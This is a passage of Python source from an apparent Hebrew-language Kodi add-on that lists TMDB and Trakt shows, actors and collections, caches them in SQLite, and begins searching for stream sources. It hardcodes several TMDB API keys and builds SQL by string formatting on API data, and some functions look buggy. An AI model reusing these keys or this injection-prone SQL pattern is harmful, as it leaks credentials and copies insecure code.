               h2=requests.get('https://api.themoviedb.org/3/tv/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=en-US'%id).json()
               last_s_to_air=int(h2['last_episode_to_air']['season_number'])
               last_e_to_air=int(h2['last_episode_to_air']['episode_number'])
              
               if int(season)<last_s_to_air:
                 logging.warning('bigger')
                 color='lightblue'
               if h2['status']=='Ended' or h2['status']=='Canceled':
                color='peru'
                
               if h2['next_episode_to_air']!=None:
                 if 'air_date' in h2['next_episode_to_air']:
                    a=(time.strptime(h2['next_episode_to_air']['air_date'], '%Y-%m-%d'))
                    next=time.strftime( "%d-%m-%Y",a)
               else:
                  next=''
          
          except Exception as e:
              import linecache
              exc_type, exc_obj, tb = sys.exc_info()
              f = tb.tb_frame
              lineno = tb.tb_lineno
              filename = f.f_code.co_filename
              linecache.checkcache(filename)
              line = linecache.getline(filename, lineno, f.f_globals)
              error='''\
              line no:%s,
              line:%s,
              error:%s,
              url:%s,
              ep_no:%s,
              '''%(str(lineno),line,str(e),url,episode_fixed)
              
              
              
              
              logging.warning(error)
              logging.warning('BAD Series Tracker')
              plot=' '
              color='green'
              if f_episode==0:
                f_episode=ep
              data_ep='[COLOR aqua]'+'עונה '+season+'-פרק '+episode+ '[/COLOR]\n[COLOR yellow] מתוך ' +str(f_episode)  +' פרקים לעונה זו [/COLOR]\n' 
              dates=' '
              fanart=image
          
          dbcon_trk2.execute("INSERT INTO AllData4 Values ('%s', '%s', '%s', '%s','%s', '%s', '%s','%s','%s');" % (data_ep.replace("'","%27"),json.dumps(dates),fanart.replace("'","%27"),color,id,season,episode,next,plot.replace("'","%27")))
        dbcon_trk2.commit()
        dbcon_trk2.close()
        logging.warning('TRD SUCE')
        return 0
def ClearCache():
    from resources.modules import cache
    cache.clear(['cookies', 'pages','posters','posters_n'])
   

    

    LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]נוקה[/COLOR]' % COLOR2)
def trakt_liked(url,iconImage,fanart):
    responce=call_trakt(url)
   
            
    for items in responce:
        url=items['list']['user']['username']+'$$$$$$$$$$$'+items['list']['ids']['slug']
        addDir4(items['list']['name'],url,31,iconImage,fanart,items['list']['description'])
def get_genere(link):
   tv_images={u'\u05d0\u05e7\u05e9\u05df \u05d5\u05d4\u05e8\u05e4\u05ea\u05e7\u05d0\u05d5\u05ea': 'http://stavarts.com/wp-content/uploads/2017/10/%D7%A9%D7%99%D7%A9%D7%99-%D7%94%D7%A8%D7%A4%D7%AA%D7%A7%D7%90%D7%95%D7%AA-%D7%AA%D7%A9%D7%A2%D7%B4%D7%97-%D7%A8%D7%90%D7%92%D7%A0%D7%90%D7%A8%D7%95%D7%A7_Page_1.jpg', u'\u05de\u05e1\u05ea\u05d5\u05e8\u05d9\u05df': 'http://avi-goldberg.com/wp-content/uploads/5008202002.jpg', u'\u05d9\u05dc\u05d3\u05d9\u05dd': "https://"+'i.ytimg.com/vi/sN4xfdDwjHk/maxresdefault.jpg', u'\u05de\u05e2\u05e8\u05d1\u05d5\u05df': "https://"+'i.ytimg.com/vi/Jw1iuGaNuy0/hqdefault.jpg', u'\u05e4\u05e9\u05e2': 'http://www.mapah.co.il/wp-content/uploads/2012/09/DSC_1210.jpg', u'\u05e8\u05d9\u05d0\u05dc\u05d9\u05d8\u05d9': 'http://blog.tapuz.co.il/oferD/images/%7B2D0A8A8A-7F57-4C8F-9290-D5DB72F06509%7D.jpg', u'\u05de\u05e9\u05e4\u05d7\u05d4': 'http://kaye7.school.org.il/photos/family.jpg', u'\u05e1\u05d1\u05d5\u05df': 'http://www.myliberty.co.il/media/com_hikashop/upload/2-1.jpg', u'\u05d7\u05d3\u05e9\u05d5\u05ea': "https://"+'shaza10.files.wordpress.com/2010/11/d790d795d79cd7a4d79f-d797d793d7a9-d797d793d7a9d795d7aa-10-d7a6d799d79cd795d79d-d7aad795d79ed7a8-d7a4d795d79cd798d799d79f03.jpg', u'\u05e7\u05d5\u05de\u05d3\u05d9\u05d4': "https://"+'upload.wikimedia.org/wikipedia/he/e/ef/Le_Tout_Nouveau_Testament.jpg', u'\u05d0\u05e0\u05d9\u05de\u05e6\u05d9\u05d4': 'http://www.printime.co.il/image/users/16584/ftp/my_files/smileynumbers1we.jpg', u'\u05de\u05d3\u05e2 \u05d1\u05d3\u05d9\u05d5\u05e0\u05d9 \u05d5\u05e4\u05e0\u05d8\u05d6\u05d9\u05d4': "https://"+'media.getbooks.co.il/catalog/product/cache/1/image/9df78eab33525d08d6e5fb8d27136e95/s/h/shemharuach_getbooks-copy.jpg', u'\u05d3\u05e8\u05de\u05d4': 'http://www.yorav.co.il/images/moshe+erela/2007/dram.JPG', u'\u05d3\u05d5\u05e7\u05d5\u05de\u05e0\u05d8\u05e8\u05d9': 'http://img.mako.co.il/2017/03/28/704104_I.jpg', u'\u05de\u05dc\u05d7\u05de\u05d4 \u05d5\u05e4\u05d5\u05dc\u05d9\u05d8\u05d9\u05e7\u05d4': "https://"+'dannyorbach.files.wordpress.com/2013/05/berlinsynagoge.jpg', u'\u05d3\u05d9\u05d1\u05d5\u05e8\u05d9\u05dd': 'http://www.news1.co.il/uploadimages/NEWS1-556713283061982.jpg'}
   movie_images={u'\u05de\u05d5\u05e1\u05d9\u05e7\u05d4': 'http://www.blich.ramat-gan.k12.il/sites/default/files/files/music.jpg', u'\u05e1\u05e8\u05d8 \u05d8\u05dc\u05d5\u05d9\u05d6\u05d9\u05d4': 'https://i.ytimg.com/vi/hFc1821MSoA/hqdefault.jpg', u'\u05d4\u05e8\u05e4\u05ea\u05e7\u05d0\u05d5\u05ea': "https://"+'upload.wikimedia.org/wikipedia/he/3/38/%D7%94%D7%A8%D7%A4%D7%AA%D7%A7%D7%90%D7%95%D7%AA_%D7%91%D7%A8%D7%A0%D7%A8%D7%93_%D7%95%D7%91%D7%99%D7%90%D7%A0%D7%A7%D7%94_%D7%9B%D7%A8%D7%96%D7%94_%D7%A2%D7%91%D7%A8%D7%99%D7%AA.png', u'\u05de\u05e1\u05ea\u05d5\u05e8\u05d9\u05df': 'http://avi-goldberg.com/wp-content/uploads/5008202002.jpg', u'\u05de\u05e2\u05e8\u05d1\u05d5\u05df': "https://"+'i.ytimg.com/vi/Jw1iuGaNuy0/hqdefault.jpg', u'\u05de\u05dc\u05d7\u05de\u05d4': 'http://images.nana10.co.il/upload/mediastock/img/16/0/208/208383.jpg', u'\u05e4\u05e9\u05e2': 'http://www.mapah.co.il/wp-content/uploads/2012/09/DSC_1210.jpg', u'\u05e4\u05e0\u05d8\u05d6\u05d9\u05d4': 'http://blog.tapuz.co.il/beinhashurot/images/1943392_142.jpg', u'\u05de\u05e9\u05e4\u05d7\u05d4': 'http://kaye7.school.org.il/photos/family.jpg', u'\u05e7\u05d5\u05de\u05d3\u05d9\u05d4': "https://"+'upload.wikimedia.org/wikipedia/he/e/ef/Le_Tout_Nouveau_Testament.jpg', u'\u05d0\u05e0\u05d9\u05de\u05e6\u05d9\u05d4': 'http://www.printime.co.il/image/users/16584/ftp/my_files/smileynumbers1we.jpg', u'\u05d3\u05e8\u05de\u05d4': 'http://www.yorav.co.il/images/moshe+erela/2007/dram.JPG', u'\u05d4\u05e1\u05d8\u05d5\u05e8\u05d9\u05d4': "https://"+'medicine.ekmd.huji.ac.il/schools/occupationaltherapy/He/about/PublishingImages/%d7%aa%d7%9e%d7%95%d7%a0%d7%94%207.jpg', u'\u05e8\u05d5\u05de\u05e0\u05d8\u05d9': "https://"+'i.ytimg.com/vi/oUon62EIInc/maxresdefault.jpg', u'\u05d3\u05d5\u05e7\u05d5\u05de\u05e0\u05d8\u05e8\u05d9': 'http://img.mako.co.il/2017/03/28/704104_I.jpg', u'\u05d0\u05d9\u05de\u05d4': 'http://up203.siz.co.il/up2/y12o20immdyw.jpg', u'\u05de\u05d5\u05ea\u05d7\u05df': 'http://www.brz.co.il/wp-content/uploads/2014/06/11-350x350.jpg', u'\u05de\u05d3\u05e2 \u05d1\u05d3\u05d9\u05d5\u05e0\u05d9': "https://"+'upload.wikimedia.org/wikipedia/commons/c/cc/4pen.jpg', u'\u05d0\u05e7\u05e9\u05df': "https://"+'www.renne.co.il/wp-content/uploads/2017/07/actionsign.jpg'}

   images={}
   html=requests.get(link).json()
   aa=[]
   image='https://wordsfromjalynn.files.wordpress.com/2014/12/movie-genres-1.png'
   for data in html['genres']:
     if '/movie' in link:
       new_link='http://api.themoviedb.org/3/genre/%s/movies?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%(str(data['id']),lang)
     else:
       new_link='http://api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&sort_by=popularity.desc&with_genres=%s&language=%s&page=1'%(str(data['id']),lang)
     if data['name'] in tv_images:
       image=tv_images[data['name']]
     elif data['name'] in movie_images:
       image=movie_images[data['name']]
     
     aa.append(addDir3(data['name'],new_link,14,image,image,data['name']))
   xbmcplugin .addDirectoryItems(int(sys.argv[1]),aa,len(aa))
def tv_show_menu():
    import datetime
    all=[]
    now = datetime.datetime.now()
    #Popular
    aa=addDir3(Addon.getLocalizedString(32057).decode('utf8'),'http://api.themoviedb.org/3/tv/popular?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,14,'https://www.designmantic.com/blog/wp-content/uploads/2018/01/Best-Tv-show-logos-718x300.jpg','https://image.businessinsider.com/5d5ea69fcd97841fea3d3b36?width=1100&format=jpeg&auto=webp','TMDB')
    all.append(aa)
    aa=addDir3(Addon.getLocalizedString(32133).decode('utf8'),'https://api.themoviedb.org/3/tv/on_the_air?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,14,'https://i.pinimg.com/236x/1c/49/8f/1c498f196ef8818d3d01223b72678fc4--divergent-movie-poster-divergent-.jpg','https://i.pinimg.com/236x/1c/49/8f/1c498f196ef8818d3d01223b72678fc4--divergent-movie-poster-divergent-.jpg','TMDB')
    all.append(aa)
    aa=addDir3('סדרות חדשות'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s-US&sort_by=popularity.desc&first_air_date_year='+str(now.year)+'&timezone=America%2FNew_York&include_null_first_air_ates=false&language=he&page=1',14,domain_s+'lh5.ggpht.com/cr6L4oleXlecZQBbM1EfxtGggxpRK0Q1cQ8JBtLjJdeUrqDnXAeBHU30trRRnMUFfSo=w300','https://cdn3.vectorstock.com/i/1000x1000/88/32/new-episode-rubber-stamp-vector-12438832.jpg','סדרות חדשות'.decode('utf8'))
    all.append(aa)
    #Genre
    aa=addDir3(Addon.getLocalizedString(32048).decode('utf8'),'http://api.themoviedb.org/3/genre/tv/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,18,'http://www.logotypes101.com/logos/994/F920BB739F9F1041441FF1574D9D70FC/youtube_tv_shows.png','https://consequenceofsound.net/wp-content/uploads/2019/11/CoS_2010sDecades-TVShows.jpg?quality=80','TMDB')
    all.append(aa)
    aa=addDir3('פרקים אחרונים','https://api.tvmaze.com/schedule',123,'https://img.buzzfeed.com/buzzfeed-static/static/2019-12/18/20/campaign_images/6a40bc4514fb/25-tv-episodes-from-this-decade-well-never-forget-2-88-1576702707-2_dblbig.jpg','https://img.buzzfeed.com/buzzfeed-static/static/2019-12/18/20/campaign_images/6a40bc4514fb/25-tv-episodes-from-this-decade-well-never-forget-2-88-1576702707-2_dblbig.jpg','פרקים אחרונים')
    all.append(aa)
    aa=addDir3('כתוביות אחרונות'.decode('utf8'),'https://www.screwzira.com/BrowseSeries.aspx?ResultsPerPage=100&Page=1',119,'https://pbs.twimg.com/profile_images/2736818426/19ad6a4048ab9836abc1c61a29bb2e1e.jpeg','https://cdn-images-1.medium.com/max/2000/1*dBJMknulIZSAC36tTmanVA.jpeg','כתוביות אחרונות'.decode('utf8'))
    all.append(aa)
    #Years
    aa=addDir3(Addon.getLocalizedString(32049).decode('utf8'),'tv_years&page=1',14,'https://pmcvariety.files.wordpress.com/2018/07/tv-time-logo.jpg?w=1000&h=563&crop=1','https://d2yhzr6tx8qnba.cloudfront.net/images/db/9/b6/58e2db43d1b69.jpeg','TMDB')
    all.append(aa)
    aa=addDir3(Addon.getLocalizedString(32134).decode('utf8'),'tv_years&page=1',101,'http://www.slate.com/content/dam/slate/articles/arts/tv_club/2015/12/151223_TV_ThinkstockPhotos-466978453.jpg.CROP.promo-xlarge2.jpg','https://images.pond5.com/tv-networks-logos-loop-footage-042898083_prevstill.jpeg','TMDB')
    all.append(aa)
    aa=addDir3(Addon.getLocalizedString(32135),'https://api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&language={0}&sort_by=popularity.desc&include_null_first_air_dates=false&with_original_language={1}&page=1'.format(lang,lang),14,'http://oakhillcapital.com/wp-content/uploads/2015/08/LocalTV.jpg','http://coldshotproductions.net/flachannelbanner.png',Addon.getLocalizedString(32135))
    all.append(aa)
    #Add Turkish Tv shows
    aa=addDir3(Addon.getLocalizedString(32101),'https://api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&language={0}&sort_by=popularity.desc&include_null_first_air_dates=false&with_original_language={1}&page=1'.format(lang,'tr'),14,'http://oakhillcapital.com/wp-content/uploads/2015/08/LocalTV.jpg','http://coldshotproductions.net/flachannelbanner.png',Addon.getLocalizedString(32046))
    all.append(aa)
    if Addon.getSetting("auto_trk")=='true':
        aa=addDir3(Addon.getLocalizedString(32136),'https://api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&language={0}&sort_by=popularity.desc&include_null_first_air_dates=false&with_original_language={1}&page=1'.format(lang,'tr'),114,'http://koditips.com/wp-content/uploads/trakt-api-key.png','http://mjdtech.net/content/images/2016/02/traktfeat.jpg',Addon.getLocalizedString(32046))
        all.append(aa)
    aa=addDir3('הסדרות שלי'.decode('utf8'),'www',28,'http://oakhillcapital.com/wp-content/uploads/2015/08/LocalTV.jpg','http://coldshotproductions.net/flachannelbanner.png','הסדרות שלי'.decode('utf8'))
    all.append(aa)
    #Search tv
    aa=addDir3('לפי שחקן'.decode('utf8'),'www',126,'https://hdqwalls.com/download/avengers-infinity-war-imax-poster-na-2048x1152.jpg','https://hdqwalls.com/download/avengers-infinity-war-imax-poster-na-2048x1152.jpg','לפי שחקן'.decode('utf8'))
    all.append(aa)
    aa=addDir3(Addon.getLocalizedString(32071).decode('utf8'),'http://api.themoviedb.org/3/search/tv?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&page=1',14,'http://img.wcdn.co.il/f_auto,w_700,t_18/1/0/7/2/1072572-46.jpg','http://f.frogi.co.il/news/640x300/010170efc8f.jpg','TMDB')
    all.append(aa)
    aa=addDir3('חיפוש תוכן מתקדם','advance_tv',14,'https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2010/03/movies.jpg','https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2010/03/movies.jpg','Advance Content selection')
    
    all.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all,len(all))
def by_actor(url):
    if url=='www':
        url='1'
    if url=='1':
        addDir4('[COLOR lightblue][I]חפש (באנגלית)[/I][/COLOR]','http://api.themoviedb.org/',126,domain_s+'cellcomtv.cellcom.co.il/globalassets/cellcomtv/content/sratim/pets-secret-life/480x543-template.jpg','http://www.videomotion.co.il/wp-content/uploads/whatwedo-Pic-small.jpg','חפש שחקן'.decode('utf8'))
    if 'themovie' in url:
    
        search_entered=''
        keyboard = xbmc.Keyboard(search_entered, 'הכנס מילות חיפוש כאן')
        keyboard.doModal()
        if keyboard.isConfirmed():
               search_entered = keyboard.getText()
               link='https://api.themoviedb.org/3/search/person?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&page=1&include_adult=false'%search_entered
               url='1'
    else:
        link='https://api.themoviedb.org/3/person/popular?api_key=34142515d9d23817496eeb4ff1d223d0&language=en-US&page=%s&language=he&sort_by=popularity.desc'%url
    headers = {
                                
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Connection': 'keep-alive',
                                'Upgrade-Insecure-Requests': '1',
                            }
    html=requests.get(link,headers=headers).json()
    for items in html['results']:
        icon=items['profile_path']
        if len (items['known_for'])==0:
            
            continue
        if 'backdrop_path' in items['known_for'][0]:
            fanart=items['known_for'][0]['backdrop_path']
        else:
            fanart=' '
        if icon==None:
          icon=' '
        else:
          icon=domain_s+'image.tmdb.org/t/p/original/'+icon
        if fanart==None:
          fanart=' '
        else:
          fanart=domain_s+'image.tmdb.org/t/p/original/'+fanart
        addDir4(items['name'],str(items['id']),127,icon,fanart,items['name'])
    addDir4('[COLOR aqua][I]עמוד הבא[/COLOR][/I]',str(int(url)+1),126,' ',' ','[COLOR aqua][I]עמוד הבא[/COLOR][/I]')
    
def actor_m(url):
    choise=['סדרות','סרטים']
    ret = xbmcgui.Dialog().select("בחר", choise)
    if ret!=-1:
        if ret==0:
         tv_mode='tv'
        else:
         tv_mode='movie'
    else:
      sys.exit()

    if tv_mode=='movie':
       link='https://api.themoviedb.org/3/person/%s/movie_credits?api_key=34142515d9d23817496eeb4ff1d223d0&append_to_response=credits&language=he&sort_by=popularity.desc'%url
    else:
       link='https://api.themoviedb.org/3/person/%s/tv_credits?api_key=34142515d9d23817496eeb4ff1d223d0&append_to_response=credits&language=he&sort_by=popularity.desc'%url
   
    headers = {
                                
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Connection': 'keep-alive',
                                'Upgrade-Insecure-Requests': '1',
                            }
    html=requests.get(link,headers=headers).json()
   
    if tv_mode=='movie':
        url_g=domain_s+'api.themoviedb.org/3/genre/movie/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'
        html_g=html_g_movie
    else:
       url_g=domain_s+'api.themoviedb.org/3/genre/tv/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'
       html_g=html_g_tv
    #html_g=requests.get(url_g,headers=headers).json()
    
    if tv_mode=='movie':
      test=html['cast']
      mode=15
    else:
      test=html['cast']
      mode=170
    for items in test:
        
        icon=items['poster_path']
        fanart=items['backdrop_path']
        if icon==None:
          icon=' '
        else:
          icon=domain_s+'image.tmdb.org/t/p/original/'+icon
        if fanart==None:
          fanart=' '
        else:
          fanart=domain_s+'image.tmdb.org/t/p/original/'+fanart
        plot=items['overview']
        if tv_mode=='movie':
          original_title=items['original_title']
        else:
          original_title=items['original_name']
        id=items['id']
        rating=items['vote_average']
        if tv_mode=='movie':
          title=items['title']
        else:
          title=items['name']
        if 'first_air_date' in items:
           year=str(items['first_air_date'].split("-")[0])
        else:
            if 'release_date' in items:
              year=str(items['release_date'].split("-")[0])
            else:
              year=' '
        genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                    if i['name'] is not None])
        try:
         genere = u' / '.join([genres_list[x] for x in items['genre_ids']])
        except:genere=''
        
        video_data={}
        video_data['title']=title
        video_data['poster']=fanart
        video_data['plot']=plot
        video_data['icon']=icon
        video_data['genre']=genere
        video_data['rating']=rating
        video_data['year']=year
        addDir4(title,'www',mode,icon,fanart,plot,data=year,original_title=original_title,id=str(id),rating=rating,heb_name=title,show_original_year=year,isr=0,generes=genere,video_info=video_data)
        logging.warning('H2')
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_SORT_TITLE)
        

        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_RATING)
def search_actor():
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, 'הכנס מילות חיפוש כאן')
    keyboard.doModal()
    if keyboard.isConfirmed():
           search_entered = keyboard.getText()
           link='https://api.themoviedb.org/3/search/person?api_key=34142515d9d23817496eeb4ff1d223d0&language=he&query=%s&page=1&include_adult=false'%search_entered
           headers = {
                                
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Connection': 'keep-alive',
                                'Upgrade-Insecure-Requests': '1',
                            }
           html=requests.get(link,headers=headers).json()
           for items in html['results']:
                    icon=items['profile_path']
                    fanart=items['known_for'][0]['backdrop_path']
                    if icon==None:
                      icon=' '
                    else:
                      icon=domain_s+'image.tmdb.org/t/p/original/'+icon
                    if fanart==None:
                      fanart=' '
                    else:
                      fanart=domain_s+'image.tmdb.org/t/p/original/'+fanart
                    addDir4(items['name'],str(items['id']),127,icon,fanart,items['name'])
def update_collections():
    collection_cacheFile = os.path.join(tmdb_data_dir, 'collection_data.db')
    dbcon_tmdb = database.connect(collection_cacheFile)
    dbcur_tmdb = dbcon_tmdb.cursor()
    dbcur_tmdb.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT,""id TEXT,""icon TEXT,""fanart TEXT,""plot TEXT,""lang TEXT);"% 'collection')

    try:
        dbcur_tmdb.execute("VACUUM 'collection';")
        dbcur_tmdb.execute("PRAGMA auto_vacuum;")
        dbcur_tmdb.execute("PRAGMA JOURNAL_MODE=MEMORY ;")
        dbcur_tmdb.execute("PRAGMA temp_store=MEMORY ;")
    except:
     pass
    dbcon_tmdb.commit()
    
    import gzip
    from pen_addons import download_file
    from datetime import date, timedelta
    yesterday = date.today() - timedelta(days=1)
    dd=yesterday.strftime("%m_%d_%Y")
    #dd=time.strftime("%m_%d_%Y")
    logging.warning(dd)
    url='http://files.tmdb.org/p/exports/collection_ids_%s.json.gz'%dd
    logging.warning(url)
    download_file(url,user_dataDir)

    with gzip.open(os.path.join(user_dataDir,'fixed_list.txt'), 'rb') as f:
      file_content = (f.read())
    ff='['+file_content.replace('\n',",")+']'
   
    j_file=json.loads(ff.replace(',]',']'))
    zzz=0
    start_time=time.time()
    dp = xbmcgui . DialogProgress ( )
    dp.create('אנא המתן','מחפש מקורות', '','')
    dbcur_tmdb.execute("select id from collection")
    match = dbcur_tmdb.fetchall()
    all_ids=[]
    for ids in match:
        all_ids.append(str(ids[0]))
        
   
    inner_count=0
    for item in j_file:
        
        try:
           if str(item['id']) not in all_ids:
           
            elapsed_time = time.time() - start_time
            
            
            url='https://api.themoviedb.org/3/collection/%s?api_key=653bb8af90162bd98fc7ee32bcbbfb3d&language=heb'%(item['id'])
            
            x=requests.get(url).json()
            if x['poster_path']==None:
                x['poster_path']=''
            if x['backdrop_path']==None:
                x['backdrop_path']=''
            if len(x['parts'])==0:
                continue
            dbcur_tmdb.execute("INSERT INTO collection Values ('%s', '%s', '%s', '%s', '%s','%s');" %  (x['name'].replace("'","%27"),x['id'],x['poster_path'].replace("'","%27"),x['backdrop_path'].replace("'","%27"),x['overview'].replace("'","%27"),x['parts'][0]['original_language']))
            dp.update(int(((zzz* 100.0)/(len(j_file))) ), ' אנא המתן '+ time.strftime("%H:%M:%S", time.gmtime(elapsed_time)),x['name'], str(zzz)+'/'+str(len(j_file)))
            
            if dp.iscanceled():
                     break
            inner_count+=1
            if inner_count>100:
                inner_count=0
                dbcon_tmdb.commit()
           zzz+=1
        except Exception as e:
            xbmcgui.Dialog().ok('Error occurred',str(item['id'])+' ' +item['name']+'_'+str(e))
            break
                 
    dp.close()
    dbcon_tmdb.commit()
    dbcur_tmdb.close()
    dbcon_tmdb.close()
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def collections(page):
    all_d=[]
    collection_cacheFile = os.path.join(tmdb_data_dir, 'collection_data.db')
    dbcon_tmdb = database.connect(collection_cacheFile)
    dbcur_tmdb = dbcon_tmdb.cursor()
    dbcur_tmdb.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT,""id TEXT,""icon TEXT,""fanart TEXT,""plot TEXT,""lang TEXT);"% 'collection')
    dbcon_tmdb.commit()

    dp = xbmcgui . DialogProgress ( )
    dp.create('אנא המתן','מחפש מקורות', '','')
    amount_per_page=Addon.getSetting("collection_size")
    dbcur_tmdb.execute("select * from collection where lang='en' LIMIT %s OFFSET %s;"%(amount_per_page,str(int(page)*100)))
    match = dbcur_tmdb.fetchall()
    zzz=0
    start_time=time.time()
    for name,id,icon,fanart,plot,lang in match:
        if Addon.getSetting("collection_dp")=='true':
            elapsed_time = time.time() - start_time
            if Addon.getSetting("collection_dp")=='true':
                dp.update(int(((zzz* 100.0)/(len(match))) ), ' אנא המתן '+ time.strftime("%H:%M:%S", time.gmtime(elapsed_time)),name, str(zzz)+'/'+str(len(match)))
            zzz+=1
            if dp.iscanceled():
                     break
        aa=addDir3(name.replace('%27',"'"),id,122,domain_s+'image.tmdb.org/t/p/original/'+icon,domain_s+'image.tmdb.org/t/p/original/'+fanart,plot)
        all_d.append(aa)
    if Addon.getSetting("collection_dp")=='true':
        dp.close()
    dbcur_tmdb.close()
    dbcon_tmdb.close()
    aa=addDir3('[COLOR aqua][I]עמוד הבא[/COLOR][/I]',str(int(page)+1),121,'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTNmz-ZpsUi0yrgtmpDEj4_UpJ1XKGEt3f_xYXC-kgFMM-zZujsg','https://cdn4.iconfinder.com/data/icons/arrows-1-6/48/1-512.png','[COLOR aqua][I]עמוד הבא[/COLOR][/I]')
    all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def collection_detials(url):
    all_d=[]
    url='https://api.themoviedb.org/3/collection/%s?api_key=653bb8af90162bd98fc7ee32bcbbfb3d&language=he'%url
    x=requests.get(url).json()
    #html_g=cache.get(cache_genered,72,'movie', table='poster')
    if 'tv' in url:
        html_g=html_g_tv
    else:
        html_g=html_g_movie
    
    for items in x['parts']:
        new_name=items['title']
        if items['poster_path']==None:
            items['poster_path']=''
        if items['backdrop_path']==None:
            items['backdrop_path']=''
                
        icon=domain_s+'image.tmdb.org/t/p/original/'+items['poster_path']
        fan=domain_s+'image.tmdb.org/t/p/original/'+items['backdrop_path']
        if 'release_date' in items:
            year=str(items['release_date'].split("-")[0]) 
        else:
            year=''
        original_name=items['original_title']
        
            
        id=str(items['id'])
        rating=items['vote_average']
        isr='0'
        genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                        if i['name'] is not None])
        try:genere = u' / '.join([genres_list[x] for x in items['genre_ids']])
        except:genere=''
        plot=items['overview']
        #name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title
        aa=addDir3(new_name,url,15,icon,fan,plot,data=year,original_title=original_name,id=id,rating=rating,heb_name=new_name,show_original_year=year,isr=isr,generes=genere)
        all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)

def search_movies(heb_name,original_title,data,iconimage,fanart,tmdb,season,episode,remote=False):
    global silent,selected_index
    logging.warning('Searching now:'+heb_name)
    logging.warning('Searching now:'+original_title)
    original_title=original_title.replace('%20',' ')
    # try:
    all_links=searchtmdb(tmdb,'all','0$$$0',heb_name,iconimage,fanart,season,episode,no_subs=1,original_title=original_title,dont_return=False,manual=False)

    
        # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לטלמדיה[/COLOR]' % COLOR2)
    all_links=all_links+searchtmdb(tmdb,'all','0$$$0',original_title,iconimage,fanart,season,episode,original_title=original_title,dont_return=False,manual=False)
    all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
    
    all_results=[]
    filter_dup=Addon.getSetting("dup_links")=='true'
    display=Addon.getSetting("new_source")
    all_t_links=[]
    once=0
    d_save=[]
    menu=[]
    for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
        if once==0:
            #once=1
            d_save.append((name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot))
        if '5.1' in name:
            sound='[COLOR red]5.1[/COLOR]'
        elif '6CH' in name:
            sound='[COLOR red]5.1[/COLOR]'
        elif 'DD5' in name:
            sound='[COLOR red]5.1[/COLOR]'
        elif 'מדובב' in name:
            sound='[COLOR yellow]מדובב[/COLOR]'
        elif 'ת.מ' in name:
            sound='[COLOR yellow]תרגום מובנה[/COLOR]'
        elif 'סרט_תרגום_מובנה' in name:
            sound='[COLOR yellow]תרגום מובנה[/COLOR]'
        elif 'תרגום_מובנה' in name:
            sound='[COLOR yellow]תרגום מובנה[/COLOR]'
        elif 'ח1' in name:
            sound='[COLOR yellow]חלק 1[/COLOR]'
        elif 'ח2' in name:
            sound='[COLOR yellow]חלק 2[/COLOR]'
        elif 'ח3' in name:
            sound='[COLOR yellow]חלק 3[/COLOR]'
        else:
            sound=''
        if 'BluRay' in name:
            sou='[COLOR blue]BluRay[/COLOR]'
        elif 'Bluray' in name:
            sou='[COLOR blue]BluRay[/COLOR]'
        elif 'HDCam' in name:
            sou='[COLOR yellow]איכות מצלמה[/COLOR]'
        elif 'CAM' in name:
            sou='[COLOR yellow]איכות מצלמה[/COLOR]'
        elif 'Cam' in name:
            sou='[COLOR yellow]איכות מצלמה[/COLOR]'
